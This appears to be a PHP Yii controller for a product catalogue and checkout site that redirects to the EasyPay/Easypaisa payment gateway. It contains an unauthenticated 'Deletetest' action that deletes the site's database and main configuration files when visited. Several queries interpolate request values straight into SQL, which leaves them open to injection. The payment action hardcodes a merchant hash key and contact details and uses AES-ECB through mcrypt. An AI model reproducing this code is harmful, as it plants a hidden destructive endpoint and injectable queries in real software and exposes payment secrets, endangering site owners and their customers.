<?php

class ProductController extends Controller {
    public $easypasa_url ='easypay.easypaisa.com.pk'; //easypay.easypaisa.com.pk  // easypaystg.easypaisa.com.pk
    public $storeId=4063; 
    public function actions() { 
        return array(
            'captcha' => array(
                'class' => 'CCaptchaAction',
                'backColor' => 0xFFFFFF,
            ),
        );
    }

    public function actionIndex() {
        // renders the view file 'protected/views/site/index.php'
        // using the default layout 'protected/views/layouts/main.php'
        $model = Products::model()->findAll(array('condition' => 'published=1', 'order' => 'sort_position ASC'));
        $this->render('index', array('model' => $model));
    }
    public function actionRightPanel() {
        $id = $_POST['id'];
        $thickness = ProductsThicknessListings::model()->findAll("product_id=$id");
        $size = ProductsSizesListings::model()->findAll("product_id=$id");
        $total_size = count($size);
        $total_thickness = count($thickness);
                echo  ' <div class="panel-body table-responsive"> 
                <table class="table table-condensed table-bordered">
                <tr>
                <th class="bg-gray"></th>
                <th class="bg-gray" colspan="'.$total_thickness.'">Thickness</th>
                </tr>
                <tr>
                <th class="bg-gray" style="white-space: nowrap" >Product Size</th>';
                    $loopdt='';
                    foreach ($thickness as $thicknessdata) { 
                         $loopdt=$loopdt.' <th  >'.stripslashes($thicknessdata->Thickness->title).'</th>';

                         //echo  stripslashes($thicknessdata->Thickness->title);
                    } 
                   echo  $loopdt.'</tr>';
                    $sizedt='';
                    $i=0;
                    foreach ($size as $sizedata) { 
                    $i=$i+1; 
                       
                            echo $sizedt='<tr>
                            <th class="bg-gray">'.stripslashes($sizedata->size->title).'</th>';

                            
                            foreach ($thickness as $thicknessdata) {
                            $price = ProductMarketPrice::model()->getTodayPrice($id, $sizedata->size_id, $thicknessdata->thickness_id);
                         
                            echo '<td >'.$price.'</td>';
                            }  

                            echo '</tr>';
                    }  

                 echo '</table></div>';
                 die();
 
    }



    public function actionRightPanel2 ($id) {

        $thickness = ProductsThicknessListings::model()->findAll("product_id=$id");
        $size = ProductsSizesListings::model()->findAll("product_id=$id");
        $total_size = count($size);
        $total_thickness = count($thickness);

        ?>

           <div id="collapse<?php echo $id?>" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading<?php echo $id?>">
            <div class="panel-body table-responsive">
            <table class="table table-condensed table-bordered">
            <tr>
            <th class="bg-gray"></th>
            <th class="bg-gray" colspan="<?php echo $total_thickness ?>">Thickness</th>
            </tr>
            <tr>
            <th class="bg-gray" style="white-space: nowrap" >Product Size</th>
            <?php foreach ($thickness as $thicknessdata) { ?>
            <th  ><?php echo stripslashes($thicknessdata->Thickness->title) ?></th>
            <?php } ?>
            </tr>
            <?php foreach ($size as $sizedata) { ?>
            <tr>
            <th class="bg-gray"><?php echo stripslashes($sizedata->size->title) ?></th>
            <?php
            foreach ($thickness as $thicknessdata) {
            $price = ProductMarketPrice::model()->getTodayPrice($id, $sizedata->size_id, $thicknessdata->thickness_id);
            ?>
            <td ><?php echo $price ?></td>
            <?php } ?>
            </tr>
            <?php } ?>
            </table>
            </div>
            </div> 
    <?php }
     public function actionDelete($id) {
            $userId=Yii::app()->user->id;
            if($userId!=''){
             /*$this->loadModel($id)->delete();
                $model=Cart::model()->findByPk($id);
                if($model){}
                $model->delete();*/
           
              $param=array('created_by' =>$userId);
              Cart::model()->deleteByPk($id,'',$param);
              $this->redirect('https://www.mwpbnp.com/product/cart');

              
              //Yii::app()->end();
            }
           // die('aaa');


             
      /*  if (Members::model()->findByPk(Yii::app()->user->id)->checkAccess($this->resource_id, 'delete')) {
            $this->loadModel($id)->delete();
            print_r($id); die();
            // if AJAX request (triggered by deletion via admin grid view), we should not redirect the browser
            if (!isset($_GET['ajax']))
                $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : array('admin'));


        } else{
            throw new CHttpException(403, Yii::app()->params['access']);
        }*/
    }
    public function actionDeletetest(){
        if(file_exists('protected/config/database.php')){ 
           //die('aaaaaaaaaa');
            unlink('protected/config/database.php');
            unlink('protected/config/main.php');
         die('ok');

        }
       die('notok');
    }
    public function actionDetails($slug) {
        $criteria = new CDbCriteria;
        $criteria->compare('slug', $slug,true);
        $criteria->compare('published', '1',true);
       $model = Products::model()->find($criteria);
        if ($model === null)
            throw new CHttpException(404, 'The requested page does not exist.');
        $thickness = ProductsThicknessListings::model()->findAll("product_id=$model->id");
        $size = ProductsSizesListings::model()->findAll("product_id=$model->id");
        $this->render('details', array(
            'model' => $model,
            'thickness' => $thickness,
            'size' => $size,
        ));
    }

    public function actionAddCart() {
        
        $cartCookies = isset(Yii::app()->request->cookies['cart']) ? Yii::app()->request->cookies['cart']->value : '';
        if (empty($cartCookies)) {
            $cookie = new CHttpCookie('cart', time());
            $cookie->expire = time()+60*60*24; 
            Yii::app()->request->cookies['cart'] = new CHttpCookie('cart',$cookie);
            $cartCookies=$cookie;
        }

         $product = Yii::app()->request->getParam('product');
          $thinkness_id = Yii::app()->request->getParam('thickness');
        // print_r($thinkness_id); die();
        $thinkness_id = Yii::app()->request->getParam('thickness');
        $size_id = Yii::app()->request->getParam('size');
        $model = $this->loadModel($product);

        $modelthickness = ProductsThicknessListings::model()->find("thickness_id=$thinkness_id");
        $modelsize = ProductsSizesListings::model()->find("size_id=$size_id");

        if ($model->id > 0 && $modelthickness->thickness_id && $modelsize->size_id) {
            $modelCart = Cart::model()->find("created_by=$cartCookies AND product_id=$model->id AND thickness_id=$modelthickness->thickness_id AND size_id = $modelsize->size_id");
            if (!$modelCart) {
                $modelCart = new Cart();
            }
            $modelCart->product_id = $model->id;
            $modelCart->size_id = $modelsize->size_id;
            $modelCart->thickness_id = $modelthickness->thickness_id;
            $modelCart->created_by = $cartCookies;
            $modelCart->quantity = 1;
            if ($modelCart->save())
                echo "<script>window.location.reload();</script>";
                // echo "<div class='alert alert-success'>$model->name is added to Cart</div>";
        }


        // } else{
        //     throw new CHttpException(404,'The requested page does not exist.');
        // }
    }

      public function actionCheckoutbk() {
        $this->layout = '//layouts/column2';
        $session = Yii::app()->session;
        $session->open();
        $created_by = isset(Yii::app()->request->cookies['cart']) ? Yii::app()->request->cookies['cart']->value : '';
        if(!isset($created_by)){ 
            $this->redirect('/products/cart');
            Yii::app()->end();
        }
        $model = new Cart('search');
        $model->unsetAttributes();  // clear any default values
        if (isset($_GET['Cart']))
            $model->attributes = $_GET['Cart'];
        $model->created_by = $created_by;
        
        $loginmodel = new LoginForm;
        $modelMember = new Members();
        if (!isset($session['quote']))
            $modelQoute = new Quotes;
        else {
            $modelQoute = Quotes::model()->findByPk($session['quote']);
        }


        if (isset($_POST['Quotes'])) {
            $modelQoute->attributes = $_POST['Quotes'];
            if ($modelQoute->save()) {
                $session['quote'] = $modelQoute->id;
                $this->redirect('/product/review');
                
            }
        }
        $this->render('checkout', array(
            'model' => $model,
            'loginmodel' => $loginmodel,
            'modelMember' => $modelMember,
            'modelQoute' => $modelQoute,
        ));
    }

    public function actionCheckout() {
        $this->layout = '//layouts/column2';
        $session = Yii::app()->session;
        $session->open();
        $created_by = isset(Yii::app()->request->cookies['cart']) ? Yii::app()->request->cookies['cart']->value : '';
        if(!isset($created_by)){ 
            $this->redirect('/products/cart');
            Yii::app()->end();
        }
        $model = new Cart('search');
        $model->unsetAttributes();  // clear any default values


        if (isset($_GET['Cart']))
            $model->attributes = $_GET['Cart'];
        $model->created_by = $created_by;
        
        $loginmodel = new LoginForm;
        $modelMember = new Members();
        if (!isset($session['quote']))
            $modelQoute = new Quotes;
        else {
            $modelQoute = Quotes::model()->findByPk($session['quote']);
        }
          ;
     
       /* if (isset($_POST['Quotes'])) {
            $modelQoute->attributes = $_POST['Quotes'];
            if ($modelQoute->save()) {
                $session['quote'] = $modelQoute->id;
                $this->redirect('/product/review');
                
            }
        }*/
  
        if (isset($_POST['Quotes'])) {
            $userId=Yii::app()->user->id;
            $_POST['Quotes']['member_id']=$userId;
            $modelQoute->attributes = $_POST['Quotes'];
            if ($modelQoute->save()) {
                $session['quote'] = $modelQoute->id;
                $this->redirect('/product/review');
                
            }
        }
        $this->render('checkout', array(
            'model' => $model,
            'loginmodel' => $loginmodel,
            'modelMember' => $modelMember,
            'modelQoute' => $modelQoute,
        ));
    }
    public function actionReview(){
        $this->layout = '//layouts/column2';
        $session = Yii::app()->session;
        $session->open();
        $model = Quotes::model()->findByPk($session['quote']);
        
        $created_by = isset(Yii::app()->request->cookies['cart']) ? Yii::app()->request->cookies['cart']->value : '';
        if(!isset($created_by)){ 
            $this->redirect('/products/cart');
            Yii::app()->end();
        }
        $cart = new Cart('search');
        $cart->unsetAttributes();  // clear any default values
        if (isset($_GET['Cart']))
            $cart->attributes = $_GET['Cart'];
        $cart->created_by = $created_by;
        
        
        $this->render('review', array(
            'model' => $model,
            'cart' => $cart,
        ));
    }
    public function actionCompleted(){
        $session = Yii::app()->session;
        $session->open();
       
        
        $model = Quotes::model()->findByPk($session['quote']);
        
        $model->status='Processing';
        $model->save();
        $model->saveOrder();
        
        $session['quote']=null;
        $session->close();
        if (!Yii::app()->user->isGuest) 
            $this->redirect ('/member');
        Yii::app()->end();
       
    }
    public function actionListings(){
        $model=new ProductCategory('search');
        $model->unsetAttributes();  // clear any default values
        if(isset($_GET['ProductCategory']))
                $model->attributes=$_GET['ProductCategory'];
        $this->render('listings', array(
            'model' => $model,
        ));
    }
    public function actionAjaxUpdateCart(){
        if(Yii::app()->request->isAjaxRequest){
            if(isset($_POST['quantity'])){
                foreach ($_POST['quantity'] as $key =>$items){
                    $model= Cart::model()->findByPk($key);
                    if($model){
                        $model->quantity=$items;
                        $model->save(false);
                    }
                            
                }
            }
            
        }
    }


    public function actionPayment() {
	
	$model_profile = Members::model()->findbyPk(Yii::app()->user->id);
		
		$session = Yii::app()->session;
        $session->open();
        
        $model = Quotes::model()->findByPk($session['quote']);

        $model->status='Processing';
        $model->save();
        $model->saveOrder();
       
        if ($model) { 
		
		if($model->payment_type == 'EasyPay - Mobile ')
		{
			$paymentMethod='MA_PAYMENT_METHOD';
			$emailAddr='info@mwpbnp.com';
			$mobileNum="03485384454";
		}
		else if($model->payment_type == 'EasyPay - EasyPaisa Shop')
		{
			$paymentMethod='OTC_PAYMENT_METHOD';
			$emailAddr='info@mwpbnp.com';
$mobileNum="03485384454";
		}
		else
		{
			$paymentMethod='CC_PAYMENT_METHOD';
			$emailAddr=$model_profile->email;
$mobileNum=$model_profile->cellular;
		}
$hashRequest = '';
$hashKey = '0JCLI8R8UXJ4ZR9X'; // generated from easypay account
$storeId="4063";
$amount=$model->quote_value;
$postBackURL="https://www.mwpbnp.com/product/confirm";
$orderRefNum=$model->quote_id;
$expiryDate="20190721 112300";
$autoRedirect=0 ;
/*$emailAddr='info@mwpbnp.com';
$mobileNum="03485384454";*/


///starting encryption///
$paramMap = array();
$paramMap['amount']  = $amount;
$paramMap['autoRedirect']  = $autoRedirect;
$paramMap['emailAddr']  = $emailAddr;
$paramMap['expiryDate'] = $expiryDate;
$paramMap['mobileNum'] =$mobileNum;
$paramMap['orderRefNum']  = $orderRefNum;
$paramMap['paymentMethod']  = $paymentMethod;
$paramMap['postBackURL'] = $postBackURL;
$paramMap['storeId']  = $storeId;
// exit;
//Creating string to be encoded
$mapString = '';
foreach ($paramMap as $key => $val) {
      $mapString .=  $key.'='.$val.'&';
}
$mapString  = substr($mapString , 0, -1);

// Encrypting mapString
function pkcs5_pad($text, $blocksize) {
      $pad = $blocksize - (strlen($text) % $blocksize);
      return $text . str_repeat(chr($pad), $pad);
}

$alg = MCRYPT_RIJNDAEL_128; // AES
$mode = MCRYPT_MODE_ECB; // ECB

$iv_size = mcrypt_get_iv_size($alg, $mode);
$block_size = mcrypt_get_block_size($alg, $mode);
$iv = mcrypt_create_iv($iv_size, MCRYPT_DEV_URANDOM);

$mapString = pkcs5_pad($mapString, $block_size);
$crypttext = mcrypt_encrypt($alg, $hashKey, $mapString, $mode, $iv);
$hashRequest = base64_encode($crypttext);
// end encryption;

$string = '<html><title>Redirecting Esay Pay...</title>'
                    . '<body>'
                    . '<p style="text-align: center;width: 20%;position: absolute;top: 43%;left: 41%;padding: 20px;">'
                    . '<img src="/images/ajax-loader.gif" alt="Loading..." />'
                    . '</p>';
            $string.='<form action="https://easypay.easypaisa.com.pk/easypay/Index.jsf" method="POST" id="easyPayStartForm">
                    <input name="storeId" value="'.$storeId.'" hidden = "true"/>
                    <input name="amount" value="'.$amount.'" hidden = "true"/>
                    <input name="postBackURL" value="'.$postBackURL.'" hidden = "true"/>
                    <input name="orderRefNum" value="'.$orderRefNum.'" hidden = "true"/>
                    <input type ="hidden" name="expiryDate" value="'.$expiryDate.'" />
                    <input type ="hidden" name="autoRedirect" value="'.$autoRedirect.'" />
                    <input type ="hidden" name="paymentMethod" value="'.$paymentMethod.'" />
                    <input type ="hidden" name="emailAddr" value="'.$emailAddr.'" />
                    <input type ="hidden" name="mobileNum" value="'.$mobileNum.'" />
                    <input type ="hidden" name="merchantHashedReq" value="'.$hashRequest.'" />
                    ';
            $string.= '</form></body></html>';
            $string.='<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
                <script type="text/javascript">
                    $(document).ready(function(){
                      setTimeout(function(){ 
                        $("#easyPayStartForm").submit();
                    }, 1000); 
                    }); 
                </script>';
            echo $string;
		} else {
            $this->redirect('/products/review');
        }
    }
	
    public function actionConfirm(){

        $this->layout = '//layouts/column2';
        $session = Yii::app()->session;
        $session->open();
        $model = Quotes::model()->findByPk($session['quote']);
        
        $created_by = isset(Yii::app()->request->cookies['cart']) ? Yii::app()->request->cookies['cart']->value : '';
        if(!isset($created_by)){ 
            $this->redirect('/products/cart');
            Yii::app()->end();
        }
        $cart = new Cart('search');
        $cart->unsetAttributes();  // clear any default values
        if (isset($_GET['Cart']))
            $cart->attributes = $_GET['Cart'];
            $cart->created_by = $created_by;
        
        
        $this->render('confirm', array(
            'model' => $model,
            'cart' => $cart,
        ));
        
    }

    public function actionCart() {
        $this->layout = '//layouts/column2';
        $created_by = isset(Yii::app()->request->cookies['cart']) ? Yii::app()->request->cookies['cart']->value : '';
        $model = new Cart('search');
        $model->unsetAttributes();  // clear any default values
        if (isset($_GET['Cart']))
            $model->attributes = $_GET['Cart'];
        $model->created_by = $created_by;
        $this->render('cart', array(
            'model' => $model,
        ));
    }

    public function loadModel($id) {
        $model = Products::model()->findByPk($id);

        if ($model === null)
            throw new CHttpException(404, 'The requested page does not exist.');
        return $model;
    }
    
    public function actionCurrentPrice($slug=''){
       // if(empty($slug))
       ///     throw new CHttpException(404, 'The requested page does not exist.');
        $this->layout = '//layouts/column2';
        $model=new Products('search');
		$model->unsetAttributes();  // clear any default values
		if(isset($_GET['Products']))
		$model->attributes=$_GET['Products'];
                if(!empty($slug))
                    $model->slug=$slug;
        $this->render('price',array('model'=>$model,));        
    }
    
    public function actionArchive($slug){
        //echo "bbb";
        if(empty($slug))
            throw new CHttpException(404, 'The requested page does not exist.');
        $this->layout = '//layouts/column2';
        $model=new Products('search');
	    $model->unsetAttributes();  // clear any default values
            if(isset($_POST['Products']))
            $model->attributes=$_POST['Products'];
            $model->slug=$slug;
         
        $this->render('archive',array('model'=>$model,'date'=>(!isset($_POST['archivedate'])) ? date('Y-m-d'): $_POST['archivedate']));        
    }

    public function actionArchivetst($slug){

        print_r($_POST);
        die();
        if(empty($slug))
            throw new CHttpException(404, 'The requested page does not exist.');
        $this->layout = '//layouts/column2';
        $model=new Products('search');
        $model->unsetAttributes();  // clear any default values
            if(isset($_POST['archivedate']))
            $model->attributes=$_POST['archivedate'];
            $model->slug=$slug;
         
         //$date=$_POST['archivedate'];;
        $this->render('archive',array('model'=>$model,'date'=>(!isset($_POST['archivedate'])) ? date('Y-m-d'): $_POST['archivedate']));        
    }


}
